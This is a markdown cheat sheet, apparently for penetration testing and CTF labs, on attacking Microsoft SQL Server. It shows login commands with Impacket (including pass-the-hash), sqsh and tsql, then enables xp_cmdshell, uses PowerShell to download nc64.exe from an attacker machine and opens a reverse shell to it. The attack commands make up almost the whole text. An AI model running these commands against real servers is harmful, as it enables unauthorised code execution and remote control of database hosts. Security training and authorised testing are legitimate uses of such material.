
# 🗃️ MSSQL Access & Exploitation Reference

This cheat sheet provides connection methods and post-exploitation commands for Microsoft SQL Server, especially useful during penetration testing or CTFs.

---

## 🔐 Connecting to MSSQL

### 🔸 Using Impacket's `mssqlclient.py`
```bash
# Windows Auth (using domain/computer name)
python3 mssqlclient.py ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth

# SQL Auth (username/password)
python3 mssqlclient.py sql_svc@<TARGET_IP> -p <password>

# If using NTLM hash
python3 mssqlclient.py sql_svc@<TARGET_IP> -hashes :<NTLM>
```

### 🔸 Using `sqsh` (Linux SQL shell)
```bash
sqsh -S <TARGET_IP> -U sql_svc
```

### 🔸 Using `tsql` from FreeTDS
```bash
tsql -H <TARGET_IP> -p 1433 -U sql_svc
```

---

## 🔎 Post-Exploitation

### ✅ Check for sysadmin privileges
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns 1 if user is sysadmin
```

---

## 💥 Enable Command Execution with `xp_cmdshell`

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Run command
EXEC xp_cmdshell 'whoami';
```

### 📝 Upload via PowerShell & Run Reverse Shell
```sql
-- PowerShell: Download nc64.exe
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<KALI_IP>/nc64.exe -outfile nc64.exe";

-- Execute reverse shell
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <KALI_IP> <PORT>";
```

---

🧠 **Tip**: Always check `IS_SRVROLEMEMBER`, and enable `xp_cmdshell` only if necessary. Clean up after use.
